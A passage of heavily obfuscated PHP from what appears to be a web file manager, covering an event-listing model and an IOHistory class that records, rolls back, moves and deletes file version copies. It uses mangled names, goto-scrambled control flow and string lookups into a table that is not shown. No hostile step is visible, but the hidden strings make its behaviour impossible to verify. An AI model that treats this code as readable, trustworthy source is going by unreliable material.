listBySource($fÌ»¢õŠ¬¶) { goto aÍï²áÌ¶™; aÍï²áÌ¶™: $DÍÎÄù¸Å° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E†“˜˜¼Åâ = Model($DÍÎÄù¸Å°[1167])->sourceInfo($fÌ»¢õŠ¬¶); $bŸõ¨ìß†¨ = array($DÍÎÄù¸Å°[399] => $fÌ»¢õŠ¬¶); goto F‡Œ†‘­¬‡; F‡Œ†‘­¬‡: if ($E†“˜˜¼Åâ[$DÍÎÄù¸Å°[386]] == $DÍÎÄù¸Å°[83]) { $a¯éå˜È× = Model($DÍÎÄù¸Å°[1167])->listSearchChildren($fÌ»¢õŠ¬¶, 20000); $a¯éå˜È×[] = $fÌ»¢õŠ¬¶ . $DÍÎÄù¸Å°[368]; $bŸõ¨ìß†¨ = array($DÍÎÄù¸Å°[385] => array($DÍÎÄù¸Å°[7], $a¯éå˜È×)); } $dÕâ†„›ë­ = $this->where($bŸõ¨ìß†¨)->order($DÍÎÄù¸Å°[1876])->selectPage(); if ($dÕâ†„›ë­[$DÍÎÄù¸Å°[358]][$DÍÎÄù¸Å°[359]] == 0) { $dÕâ†„›ë­[$DÍÎÄù¸Å°[358]][$DÍÎÄù¸Å°[359]] = 1; $dÕâ†„›ë­[$DÍÎÄù¸Å°[361]] = array(array($DÍÎÄù¸Å°[399] => $fÌ»¢õŠ¬¶, $DÍÎÄù¸Å°[1859] => $E†“˜˜¼Åâ[$DÍÎÄù¸Å°[478]], $DÍÎÄù¸Å°[1482] => $E†“˜˜¼Åâ[$DÍÎÄù¸Å°[394]], $DÍÎÄù¸Å°[404] => $DÍÎÄù¸Å°[1877], $DÍÎÄù¸Å°[405] => $E†“˜˜¼Åâ[$DÍÎÄù¸Å°[190]], $DÍÎÄù¸Å°[1484] => $DÍÎÄù¸Å°[33])); } goto Cˆá†¾‡¹‚; Cˆá†¾‡¹‚: return $this->eventListParse($dÕâ†„›ë­, $fÌ»¢õŠ¬¶); goto DÔ‘†‚¿¸Á; DÔ‘†‚¿¸Á: } private function eventListParse($eİò§è©Œø, $AëçéØòŠŒ) { goto E·¹‡¬×µ; A ö·á½‘Œ: $a«¸„œä±Ñ = Model($e®¨ŒàÃ°„[759])->sourceListInfo($d¾Ò©‰¼, !0); foreach ($fÙçŸöŞÛ“ as &$E¾£¢Áéã) { if ($E¾£¢Áéã[$e®¨ŒàÃ°„[29]] == $e®¨ŒàÃ°„[509] && isset($E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[1019]])) { $E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[1019]] = $a«¸„œä±Ñ[$E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[1019]]]; $E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[1020]] = $a«¸„œä±Ñ[$E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[1020]]]; } if ($E¾£¢Áéã[$e®¨ŒàÃ°„[29]] == $e®¨ŒàÃ°„[1873] && isset($E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[385]])) { $E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[385]] = $a«¸„œä±Ñ[$E¾£¢Áéã[$e®¨ŒàÃ°„[421]][$e®¨ŒàÃ°„[385]]]; } $E¾£¢Áéã[$e®¨ŒàÃ°„[407]] = $a«¸„œä±Ñ[$E¾£¢Áéã[$e®¨ŒàÃ°„[385]]]; $E¾£¢Áéã[$e®¨ŒàÃ°„[1878]] = $a«¸„œä±Ñ[$E¾£¢Áéã[$e®¨ŒàÃ°„[1865]]]; if ($E¾£¢Áéã[$e®¨ŒàÃ°„[29]] == $e®¨ŒàÃ°„[1616]) { $E¾£¢Áéã[$e®¨ŒàÃ°„[1878]] = $E¾£¢Áéã[$e®¨ŒàÃ°„[407]]; $E¾£¢Áéã[$e®¨ŒàÃ°„[1865]] = $E¾£¢Áéã[$e®¨ŒàÃ°„[1878]][$e®¨ŒàÃ°„[385]]; $E¾£¢Áéã[$e®¨ŒàÃ°„[407]] = !1; $E¾£¢Áéã[$e®¨ŒàÃ°„[385]] = $e®¨ŒàÃ°„[33]; } $E¾£¢Áéã[$e®¨ŒàÃ°„[1808]] = $A›ö×Š¼É[$E¾£¢Áéã[$e®¨ŒàÃ°„[1490]]]; } unset($E¾£¢Áéã); goto Eô‹•‹µœ·; C‘ŞÛğ¶½Ô: $d¾Ò©‰¼ = array_unique($d¾Ò©‰¼); $D–ÊïËÖÖ = array_unique(array_to_keyvalue($fÙçŸöŞÛ“, $e®¨ŒàÃ°„[33], $e®¨ŒàÃ°„[1490])); $A›ö×Š¼É = Model($e®¨ŒàÃ°„[494])->userListInfo($D–ÊïËÖÖ); goto A ö·á½‘Œ; e¤†“‹ä×: $Eİ¤æöî¸ = array_to_keyvalue($fÙçŸöŞÛ“, $e®¨ŒàÃ°„[33], $e®¨ŒàÃ°„[1865]); foreach ($fÙçŸöŞÛ“ as $E¾£¢Áéã) { $F§øí½‘Â“ = $E¾£¢Áéã[$e®¨ŒàÃ°„[421]]; if ($E¾£¢Áéã[$e®¨ŒàÃ°„[29]] == $e®¨ŒàÃ°„[509] && isset($F§øí½‘Â“[$e®¨ŒàÃ°„[1019]])) { $d¾Ò©‰¼[] = $F§øí½‘Â“[$e®¨ŒàÃ°„[1019]] . $e®¨ŒàÃ°„[33]; $d¾Ò©‰¼[] = $F§øí½‘Â“[$e®¨ŒàÃ°„[1020]] . $e®¨ŒàÃ°„[33]; } if ($E¾£¢Áéã[$e®¨ŒàÃ°„[29]] == $e®¨ŒàÃ°„[1873] && isset($F§øí½‘Â“[$e®¨ŒàÃ°„[385]])) { $d¾Ò©‰¼[] = $F§øí½‘Â“[$e®¨ŒàÃ°„[385]] . $e®¨ŒàÃ°„[33]; } } $d¾Ò©‰¼ = array_merge($d¾Ò©‰¼, $Eİ¤æöî¸, array($AëçéØòŠŒ . $e®¨ŒàÃ°„[33])); goto C‘ŞÛğ¶½Ô; E·¹‡¬×µ: $e®¨ŒàÃ°„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÙçŸöŞÛ“ = $eİò§è©Œø[$e®¨ŒàÃ°„[361]]; $d¾Ò©‰¼ = array_to_keyvalue($fÙçŸöŞÛ“, $e®¨ŒàÃ°„[33], $e®¨ŒàÃ°„[385]); goto e¤†“‹ä×; Eô‹•‹µœ·: $eİò§è©Œø[$e®¨ŒàÃ°„[361]] = $fÙçŸöŞÛ“; return $eİò§è©Œø; goto c™º÷ìÜ¦‚; c™º÷ìÜ¦‚: } public function removeBySource($Aˆ†÷¤òøÌ) { $F¯Á£¬®¤ñ = array($_SERVER[ÈİÅ¿ÈÈ¥×][399] => $Aˆ†÷¤òøÌ); $this->where($F¯Á£¬®¤ñ)->remove(); } } goto d©µ‡÷‚†·; DŒ¡è‘™‘ƒ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto FÎÃßÖÄøƒ; f´ä–§„¶è: Hook::bind($dŸØ„‰¥¯[1074], $dŸØ„‰¥¯[1075]); Hook::bind($dŸØ„‰¥¯[1076], $dŸØ„‰¥¯[1077]); Hook::bind($dŸØ„‰¥¯[1078], $dŸØ„‰¥¯[1079]); goto E¡‡œ¸ÊéĞ; Cñ´·éç±: Hook::bind($dŸØ„‰¥¯[1068], $dŸØ„‰¥¯[1069]); Hook::bind($dŸØ„‰¥¯[1070], $dŸØ„‰¥¯[1071]); Hook::bind($dŸØ„‰¥¯[1072], $dŸØ„‰¥¯[1073]); goto f´ä–§„¶è; FÎÃßÖÄøƒ: $dŸØ„‰¥¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¦ÏÛƒÄ± = $GLOBALS[$dŸØ„‰¥¯[6]][$dŸØ„‰¥¯[84]][$dŸØ„‰¥¯[1067]]; if ($c¦ÏÛƒÄ± <= 0) { return; } goto Cñ´·éç±; E¡‡œ¸ÊéĞ: } public static function eventBeforeUpload($dÏõæàÁ¹‡) { if ($dÏõæàÁ¹‡[3] && $dÏõæàÁ¹‡[3] != REPEAT_REPLACE) { return; } $eÙã¦²¥èâ = self::parsePath($dÏõæàÁ¹‡[0]); if (!$eÙã¦²¥èâ) { return; } self::add($eÙã¦²¥èâ); } public static function eventBeforeEdit($DğöŞÄ™Ã‡) { $b¾©ä¡¼‘ = self::parsePath($DğöŞÄ™Ã‡[0]); if (!$b¾©ä¡¼‘) { return; } self::add($b¾©ä¡¼‘); } public static function eventBeforeCopyFile($eåÌ––Ê«™, $e»öÉ•èäë, $CÅ¾Ò¢ŒÓ¥, $f–ô¿‰•™‡, $e™êÒé÷ËØ, $cïé¾ºÌöŠ) { $dŒì¯“å¶ = $CÅ¾Ò¢ŒÓ¥->getPathOuter($f–ô¿‰•™‡); $cÆ¿‘Š¢ô = self::parsePath($dŒì¯“å¶); if (!$cÆ¿‘Š¢ô) { return; } self::add($cÆ¿‘Š¢ô); } public static function eventBeforeRename($c‘˜Ğî×ÇÅ) { $BŠ³”¶â¬æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b°í…Á§ˆ = self::parsePath($c‘˜Ğî×ÇÅ[0]); if (!$b°í…Á§ˆ) { return; } $e§¨Ù“Õ = self::checkInHistory($b°í…Á§ˆ); if (!$e§¨Ù“Õ) { return; } if ($e§¨Ù“Õ[$BŠ³”¶â¬æ[29]] == $BŠ³”¶â¬æ[171]) { $aÇÑ…‹Œ = self::listData($b°í…Á§ˆ); if ($aÇÑ…‹Œ && $aÇÑ…‹Œ[$BŠ³”¶â¬æ[361]]) { self::moveHistory($b°í…Á§ˆ, $c‘˜Ğî×ÇÅ[1]); } } else { IO::rename($e§¨Ù“Õ[$BŠ³”¶â¬æ[75]], $c‘˜Ğî×ÇÅ[1]); } } public static function eventBeforeMove($f»õÊÒÃÆ›) { goto AÜ¯ô·›”—; AÜ¯ô·›”—: $F‘‹’Ù³¯“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bĞÍîö„Š = self::parsePath($f»õÊÒÃÆ›[0]); if (!$bĞÍîö„Š) { return; } goto AÒâ¨½¶†é; AÒâ¨½¶†é: $a¡àèÁÆÌ = self::parsePath($f»õÊÒÃÆ›[1]); if (!$a¡àèÁÆÌ) { return; } $aâ™®Ë¤Öµ = $f»õÊÒÃÆ›[3]; goto dø‰•ŠÜê; B÷Êº¬­Úã: if ($eÜ£ìÎäë[$F‘‹’Ù³¯“[29]] == $F‘‹’Ù³¯“[171]) { $CÜ†ÈÔë°” = self::listData($bĞÍîö„Š); $Fø£Üçñµ‰ = rtrim($a¡àèÁÆÌ, $F‘‹’Ù³¯“[8]) . $F‘‹’Ù³¯“[8] . ($aâ™®Ë¤Öµ ? $aâ™®Ë¤Öµ : get_path_this($bĞÍîö„Š)); $DìÀ²äµÅ = self::listData($Fø£Üçñµ‰); if ($CÜ†ÈÔë°” && $CÜ†ÈÔë°”[$F‘‹’Ù³¯“[361]] && $DìÀ²äµÅ && $DìÀ²äµÅ[$F‘‹’Ù³¯“[361]]) { return self::clear($bĞÍîö„Š); } if ($CÜ†ÈÔë°” && $CÜ†ÈÔë°”[$F‘‹’Ù³¯“[361]]) { self::moveHistory($bĞÍîö„Š, $aâ™®Ë¤Öµ, $A–°ÂÕğØê); } } else { IO::move($eÜ£ìÎäë[$F‘‹’Ù³¯“[75]], $A–°ÂÕğØê, !1, $aâ™®Ë¤Öµ); self::clearEmptyFolder(IO::pathFather($eÜ£ìÎäë[$F‘‹’Ù³¯“[75]])); } goto aÀ®°Ä¿¥Ì; dø‰•ŠÜê: $eÜ£ìÎäë = self::checkInHistory($bĞÍîö„Š); if (!$eÜ£ìÎäë) { return; } $A–°ÂÕğØê = self::pathHistory($a¡àèÁÆÌ); goto B÷Êº¬­Úã; aÀ®°Ä¿¥Ì: } public static function eventAfterRemove($bÖ×‘‘×£, $Eì¶¸å¼ªİ) { goto FÈ¡Ä¯Ñà; f®¾œŒê‚–: if (!$Eíà´¢‡À) { return; } $fóê„£ç‚³ = self::checkInHistory($Eíà´¢‡À); if (!$fóê„£ç‚³) { return; } goto dÌàÀË³ƒ–; FÈ¡Ä¯Ñà: $AœÊæÙÀ¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Eì¶¸å¼ªİ) { return; } $Eíà´¢‡À = self::parsePath($bÖ×‘‘×£[0]); goto f®¾œŒê‚–; dÌàÀË³ƒ–: if ($fóê„£ç‚³[$AœÊæÙÀ¸[29]] == $AœÊæÙÀ¸[171]) { $b÷ŸÅ³ÌÂ  = self::listData($Eíà´¢‡À, !1); if ($b÷ŸÅ³ÌÂ  && $b÷ŸÅ³ÌÂ [$AœÊæÙÀ¸[361]]) { self::clear($Eíà´¢‡À, !1); } } else { IO::remove($fóê„£ç‚³[$AœÊæÙÀ¸[75]]); self::clearEmptyFolder(IO::pathFather($fóê„£ç‚³[$AœÊæÙÀ¸[75]])); } goto EˆÛÂ³ß®Ú; EˆÛÂ³ß®Ú: } private static function checkInHistory($aôù•Î®) { $eÄÍ«í™‘­ = self::pathHistory($aôù•Î®); if (!IO::exist($eÄÍ«í™‘­)) { $eÄÍ«í™‘­ .= $_SERVER[ÈİÅ¿ÈÈ¥×][1080]; } return IO::exist($eÄÍ«í™‘­) ? IO::info($eÄÍ«í™‘­) : !1; } private static function parsePath($cŠ³Åö“‰µ) { goto FĞÏªÕ´æå; bÕÂÏ‰Æ¦ò: $AÎÆ²‡ğƒ‹ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $fÖò·Ïğ‰[1083]); foreach ($AÎÆ²‡ğƒ‹ as $bÍŞ«÷îÙÉ) { if (!$DŒå‰áƒå” && substr($cŠ³Åö“‰µ, 0, strlen($bÍŞ«÷îÙÉ)) == $bÍŞ«÷îÙÉ) { return !1; } } self::log($GLOBALS[$fÖò·Ïğ‰[1007]] . $fÖò·Ïğ‰[1084] . $cŠ³Åö“‰µ); goto e–Ÿå…ÆÀ; aéÑÒ‚ÌòÄ: $fÅÛöµ¢½Î = KodIO::parse($cŠ³Åö“‰µ); $DŒå‰áƒå” = $fÅÛöµ¢½Î[$fÖò·Ïğ‰[29]]; $f‡‰Œº©® = !$DŒå‰áƒå” || $DŒå‰áƒå” == KodIO::KOD_IO || $DŒå‰áƒå” == KodIO::KOD_SHARE_ITEM; goto f¦Óô•ø¦; FĞÏªÕ´æå: $fÖò·Ïğ‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$cŠ³Åö“‰µ) { return !1; } if ($GLOBALS[$fÖò·Ïğ‰[1081]]) { return; } goto aéÑÒ‚ÌòÄ; f¦Óô•ø¦: if (!$f‡‰Œº©® || !$fÅÛöµ¢½Î[$fÖò·Ïğ‰[1082]]) { return !1; } if ($DŒå‰áƒå” == KodIO::KOD_SHARE_ITEM) { $BøÃã«Å™± = IO::init($cŠ³Åö“‰µ); if ($BøÃã«Å™±->pathParse[$fÖò·Ïğ‰[1012]]) { return self::parsePath($BøÃã«Å™±->pathParse[$fÖò·Ïğ‰[1012]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bÕÂÏ‰Æ¦ò; e–Ÿå…ÆÀ: return $cŠ³Åö“‰µ; goto b‘¸‹ºÔ‹; b‘¸‹ºÔ‹: } private static function pathHistory($A£”èìØÑ) { $fÔ„¬ŒĞ± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DœÆŠ¹¼™ = self::$_historyBase . ltrim(KodIO::clear($A£”èìØÑ), $fÔ„¬ŒĞ±[8]); $DœÆŠ¹¼™ = str_replace(array($fÔ„¬ŒĞ±[1085]), array($fÔ„¬ŒĞ±[1086]), $DœÆŠ¹¼™); return $DœÆŠ¹¼™; } public static function log($c‡½ìï”Ø¦) { } public static function historyCount($a¼ ‚ã»ö) { $e¨ñ”ğ×â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÀ½‡“«æÊ = array(); $CÜÕ‰ÚËáŒ = array(); foreach ($a¼ ‚ã»ö as $FÚŸµæ°±é) { $b—™í‰Ğ• = get_path_father($FÚŸµæ°±é); if (!$CÜÕ‰ÚËáŒ[$b—™í‰Ğ•]) { $CÜÕ‰ÚËáŒ[$b—™í‰Ğ•] = array(); } $CÜÕ‰ÚËáŒ[$b—™í‰Ğ•][] = get_path_this($FÚŸµæ°±é); } foreach ($CÜÕ‰ÚËáŒ as $b—™í‰Ğ• => $B‰ªÈ¬†ğ¦) { $EÀŞ­‡Ş™ = self::parsePath($b—™í‰Ğ•); if (!$EÀŞ­‡Ş™) { continue; } foreach ($B‰ªÈ¬†ğ¦ as $B¸©ª‰Ö ¡) { $dòÛê§…è = self::listData(rtrim($EÀŞ­‡Ş™, $e¨ñ”ğ×â[8]) . $e¨ñ”ğ×â[8] . $B¸©ª‰Ö ¡, !1); if ($dòÛê§…è && $dòÛê§…è[$e¨ñ”ğ×â[361]]) { $FÀ½‡“«æÊ[rtrim($b—™í‰Ğ•, $e¨ñ”ğ×â[8]) . $e¨ñ”ğ×â[8] . $B¸©ª‰Ö ¡] = count($dòÛê§…è[$e¨ñ”ğ×â[361]]); } } } return $FÀ½‡“«æÊ; } public static function add($Aí®£Ã®šô) { goto bäºàø¤™; fˆ÷Œ¨ºŞä: return self::saveData($B½š‹ƒµ§[$eÀì‚¦¶íº[1093]], $c­‡ÕŸ±Ñ); goto d™Ìé ÇŒä; E¤‰†¤ëÅŒ: if ($AÄˆÉªŞ“² <= 0) { return; } $f¨®íí»Íç = IO::hashSimple($Aí®£Ã®šô); $f‰›Ÿ¹ùÀ¨ = IO::info($Aí®£Ã®šô); goto dÓ‡ÌÛ¥õ¿; bäºàø¤™: $eÀì‚¦¶íº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B½š‹ƒµ§ = self::listData($Aí®£Ã®šô); if (!$B½š‹ƒµ§) { return; } goto b÷‹¼î¾ï‡; b¾Áî©²¼: if ($c­‡ÕŸ±Ñ && $c­‡ÕŸ±Ñ[0][$eÀì‚¦¶íº[168]] == $f¨®íí»Íç) { return !0; } if (array_key_exists($eÀì‚¦¶íº[192], $f‰›Ÿ¹ùÀ¨) && !$f‰›Ÿ¹ùÀ¨[$eÀì‚¦¶íº[192]]) { return !1; } $Cö³àˆÇË´ = short_id(time()); goto Fä…Ïè…Ÿ†; dÓ‡ÌÛ¥õ¿: $c­‡ÕŸ±Ñ = $B½š‹ƒµ§[$eÀì‚¦¶íº[361]]; if ($f‰›Ÿ¹ùÀ¨[$eÀì‚¦¶íº[77]] == 0) { return; } if ($f‰›Ÿ¹ùÀ¨[$eÀì‚¦¶íº[77]] >= 1024 * 1024 * 500) { return !1; } goto b¾Áî©²¼; Fä…Ïè…Ÿ†: $A‰¿ª²„Ãµ = array($eÀì‚¦¶íº[383] => $Cö³àˆÇË´, $eÀì‚¦¶íº[168] => $f¨®íí»Íç, $eÀì‚¦¶íº[28] => $f‰›Ÿ¹ùÀ¨[$eÀì‚¦¶íº[28]] . $eÀì‚¦¶íº[91] . date($eÀì‚¦¶íº[1090]) . rand_string(1), $eÀì‚¦¶íº[77] => $f‰›Ÿ¹ùÀ¨[$eÀì‚¦¶íº[77]], $eÀì‚¦¶íº[394] => USER_ID, $eÀì‚¦¶íº[190] => time(), $eÀì‚¦¶íº[1091] => $eÀì‚¦¶íº[33]); IO::mkdir($B½š‹ƒµ§[$eÀì‚¦¶íº[1092]]); $DÉÍæ‘Ä°´ = IO::copy($Aí®£Ã®šô, $B½š‹ƒµ§[$eÀì‚¦¶íº[1092]], !1, $A‰¿ª²„Ãµ[$eÀì‚¦¶íº[28]]); goto aÈ‰øÓÚå; aÈ‰øÓÚå: if (!$DÉÍæ‘Ä°´) { self::clearEmptyFolder($B½š‹ƒµ§[$eÀì‚¦¶íº[1092]]); return !1; } array_unshift($c­‡ÕŸ±Ñ, $A‰¿ª²„Ãµ); if (count($c­‡ÕŸ±Ñ) > $FÀ‹ƒéÍ¸ª) { $c Ã¤¢âÒ = array_slice($c­‡ÕŸ±Ñ, $FÀ‹ƒéÍ¸ª); foreach ($c Ã¤¢âÒ as $EÙŠ¦Ìº) { IO::remove($B½š‹ƒµ§[$eÀì‚¦¶íº[1092]] . $EÙŠ¦Ìº[$eÀì‚¦¶íº[28]]); } $c­‡ÕŸ±Ñ = array_slice($c­‡ÕŸ±Ñ, 0, $FÀ‹ƒéÍ¸ª); } goto fˆ÷Œ¨ºŞä; b÷‹¼î¾ï‡: $Bª‘È‘Ç°¶ = Model($eÀì‚¦¶íº[1087])->get($eÀì‚¦¶íº[1088]); $AÄˆÉªŞ“² = $GLOBALS[$eÀì‚¦¶íº[6]][$eÀì‚¦¶íº[84]][$eÀì‚¦¶íº[1067]]; $FÀ‹ƒéÍ¸ª = $Bª‘È‘Ç°¶ == $eÀì‚¦¶íº[1089] ? 5 : $AÄˆÉªŞ“²; goto E¤‰†¤ëÅŒ; d™Ìé ÇŒä: } public static function remove($AçÑ•†ºÕ‰, $ağ®•æö½Í) { $eŒ÷ŸáäÍÉ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F¸¤ˆå– = self::listData($AçÑ•†ºÕ‰); $b‰¿Åˆó†  = array(); if (!$F¸¤ˆå–) { return !1; } foreach ($F¸¤ˆå–[$eŒ÷ŸáäÍÉ[361]] as $eæÊ‚ÉÆ¨ø) { if ($eæÊ‚ÉÆ¨ø[$eŒ÷ŸáäÍÉ[383]] == $ağ®•æö½Í) { IO::remove($F¸¤ˆå–[$eŒ÷ŸáäÍÉ[1092]] . $eæÊ‚ÉÆ¨ø[$eŒ÷ŸáäÍÉ[28]]); continue; } $b‰¿Åˆó† [] = $eæÊ‚ÉÆ¨ø; } return self::saveData($F¸¤ˆå–[$eŒ÷ŸáäÍÉ[1093]], $b‰¿Åˆó† ); } public static function clear($cè”£†øÉŸ, $eÀ§ôâ¼„³ = true) { $B“ ¶œ×ëÍ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E©ùÚ¹ÃñØ = self::listData($cè”£†øÉŸ, $eÀ§ôâ¼„³); if (!$E©ùÚ¹ÃñØ) { return !1; } foreach ($E©ùÚ¹ÃñØ[$B“ ¶œ×ëÍ[361]] as $C©Ëõ¹´”×) { IO::remove($E©ùÚ¹ÃñØ[$B“ ¶œ×ëÍ[1092]] . $C©Ëõ¹´”×[$B“ ¶œ×ëÍ[28]]); } return self::saveData($E©ùÚ¹ÃñØ[$B“ ¶œ×ëÍ[1093]], array()); } public static function moveHistory($b¹ƒ¾µ·‡œ, $Fàö²•“Ğ = '', $A™İøãÅ‡ = '') { goto Aİ÷ÏØôÅÂ; f®Šâß‹ÚŒ: $aÚĞĞÎá¶‚ = $bš´ø……[1080]; $Fàö²•“Ğ = $Fàö²•“Ğ ? $Fàö²•“Ğ : get_path_this($b¹ƒ¾µ·‡œ); $A™İøãÅ‡ = $A™İøãÅ‡ ? $A™İøãÅ‡ : $A’ŒáÜ¡“ô[$bš´ø……[1092]]; goto b¬Ô†½¾–; b¬Ô†½¾–: $d…„„“­ = substr(get_path_this($A’ŒáÜ¡“ô[$bš´ø……[1093]]), 0, -strlen($aÚĞĞÎá¶‚)); foreach ($A’ŒáÜ¡“ô[$bš´ø……[361]] as $E£êÑ™Ö => $E‹Œµæ´ì¡) { $e‘¸ÒŸºï = $Fàö²•“Ğ . substr($E‹Œµæ´ì¡[$bš´ø……[28]], strlen($d…„„“­)); $e¯³‚Ú·Œê = IO::move($A’ŒáÜ¡“ô[$bš´ø……[1092]] . $E‹Œµæ´ì¡[$bš´ø……[28]], $A™İøãÅ‡, !1, $e‘¸ÒŸºï); if ($e¯³‚Ú·Œê) { $A’ŒáÜ¡“ô[$bš´ø……[361]][$E£êÑ™Ö][$bš´ø……[28]] = $e‘¸ÒŸºï; } } $A’ŒáÜ¡“ô[$bš´ø……[1093]] = IO::move($A’ŒáÜ¡“ô[$bš´ø……[1093]], $A™İøãÅ‡, !1, $Fàö²•“Ğ . $aÚĞĞÎá¶‚); goto B«„ß”²Ä½; Aİ÷ÏØôÅÂ: $bš´ø…… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A’ŒáÜ¡“ô = self::listData($b¹ƒ¾µ·‡œ, !1); if (!$A’ŒáÜ¡“ô || !$A’ŒáÜ¡“ô[$bš´ø……[361]]) { return !1; } goto f®Šâß‹ÚŒ; B«„ß”²Ä½: self::saveData($A’ŒáÜ¡“ô[$bš´ø……[1093]], $A’ŒáÜ¡“ô[$bš´ø……[361]]); self::clearEmptyFolder($A’ŒáÜ¡“ô[$bš´ø……[1092]]); goto fôË„óƒí; fôË„óƒí: } public static function rollback($CÚ­‘ÔµŒ, $b´äÇÖÉÚ) { $C›–ôµîã¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eß¶„ÀæµŒ = self::listData($CÚ­‘ÔµŒ); if (!$Eß¶„ÀæµŒ) { return; } $eíòŒ™‹Ã = IO::info($CÚ­‘ÔµŒ); foreach ($Eß¶„ÀæµŒ[$C›–ôµîã¶[361]] as $DÕ•µÉ‹Ì“ => $CÇÓÌ¶ùˆ™) { if ($CÇÓÌ¶ùˆ™[$C›–ôµîã¶[383]] == $b´äÇÖÉÚ) { self::add($CÚ­‘ÔµŒ); $C…îáŸœ¼‹ = $Eß¶„ÀæµŒ[$C›–ôµîã¶[1092]] . $CÇÓÌ¶ùˆ™[$C›–ôµîã¶[28]]; $FØî­ß°‹ = IO::copy($C…îáŸœ¼‹, IO::pathFather($CÚ­‘ÔµŒ), REPEAT_REPLACE, $eíòŒ™‹Ã[$C›–ôµîã¶[28]]); if ($FØî­ß°‹) { self::remove($CÚ­‘ÔµŒ, $b´äÇÖÉÚ); } return $FØî­ß°‹; } } return !1; } public static function setDetail($CİŞÙ°ÅÏœ, $DàÅ¤¦²¡, $f×æ¡ÂÒ„) { $A­±Øù÷Ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÄ¤‡Ğ‚åã = self::listData($CİŞÙ°ÅÏœ); if (!$cÄ¤‡Ğ‚åã) { return; } foreach ($cÄ¤‡Ğ‚åã[$A­±Øù÷Ù[361]] as $EÖš›£ÈÛ => $CÅ°«È¡ÖÅ) { if ($CÅ°«È¡ÖÅ[$A­±Øù÷Ù[383]] == $DàÅ¤¦²¡) { $cÄ¤‡Ğ‚åã[$A­±Øù÷Ù[361]][$EÖš›£ÈÛ][$A­±Øù÷Ù[1091]] = $f×æ¡ÂÒ„; self::saveData($cÄ¤‡Ğ‚åã[$A­±Øù÷Ù[1093]], $cÄ¤‡Ğ‚åã[$A­±Øù÷Ù[361]]); return !0; } } return !1; } public static function fileInfo($CÜ³õ£ÌöÃ, $DÖ¯¼“¨Ä) { goto AĞØÎÂŸù…; b¬ŞŞˆ±Ê‹: $F£í‹ëÄ‘Ê = $EµÈ‚ä¸‘[33]; foreach ($FÓÙÆÅè[$EµÈ‚ä¸‘[361]] as $fƒŞÕ»À¶ => $dí±¿êÈÎ) { if ($dí±¿êÈÎ[$EµÈ‚ä¸‘[383]] != $DÖ¯¼“¨Ä) { continue; } $F£í‹ëÄ‘Ê = $FÓÙÆÅè[$EµÈ‚ä¸‘[1092]] . $dí±¿êÈÎ[$EµÈ‚ä¸‘[28]]; break; } if (!$F£í‹ëÄ‘Ê) { show_json(LNG($EµÈ‚ä¸‘[101]), !1); } goto fé‚ÌÉÓ®; fé‚ÌÉÓ®: return IO::info($F£í‹ëÄ‘Ê); goto eŠÏµ±¬‘Ä; AĞØÎÂŸù…: $EµÈ‚ä¸‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÓÙÆÅè = self::listData($CÜ³õ£ÌöÃ); if (!$FÓÙÆÅè) { show_json(LNG($EµÈ‚ä¸‘[101]), !1); } goto b¬ŞŞˆ±Ê‹; eŠÏµ±¬‘Ä: } public static function fileOut($dë“¬ŠÇÅŞ, $d©‹‚£Ğ¦, $c™¾ÆĞâ = false) { $F¬Á«•æÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EŠ÷›‚ç¹ô = self::fileInfo($dë“¬ŠÇÅŞ, $d©‹‚£Ğ¦); $AğÅ¼Íç˜Ü =& $GLOBALS[$F¬Á«•æÎ[7]]; $c™¾ÆĞâ = isset($AğÅ¼Íç˜Ü[$F¬Á«•æÎ[1058]]) && $AğÅ¼Íç˜Ü[$F¬Á«•æÎ[1058]] == 1; if (isset($AğÅ¼Íç˜Ü[$F¬Á«•æÎ[29]]) && $AğÅ¼Íç˜Ü[$F¬Á«•æÎ[29]] == $F¬Á«•æÎ[1094]) { return IO::fileOutImage($EŠ÷›‚ç¹ô[$F¬Á«•æÎ[75]], $AğÅ¼Íç˜Ü[$F¬Á«•æÎ[1095]]); } IO::fileOut($EŠ÷›‚ç¹ô[$F¬Á«•æÎ[75]], $c™¾ÆĞâ, get_path_this($dë“¬ŠÇÅŞ)); } public static function listData($eËÚ˜¢¢ªİ, $FÄòâ¦¼¯Ä = true) { goto bš¶¾‹ÓòØ; bš¶¾‹ÓòØ: $BŸ¯ÒÌæÚä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($FÄòâ¦¼¯Ä && !IO::exist($eËÚ˜¢¢ªİ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Dæ×„«Ù’É; f‘öïò¿îÂ: $c©­‹­Ö = IO::getContent($bğñ¸’°î©[$BŸ¯ÒÌæÚä[1093]]); if ($c©­‹­Ö) { $eŸîïù‚¸Ò = json_decode($c©­‹­Ö, !0); if (is_array($eŸîïù‚¸Ò)) { 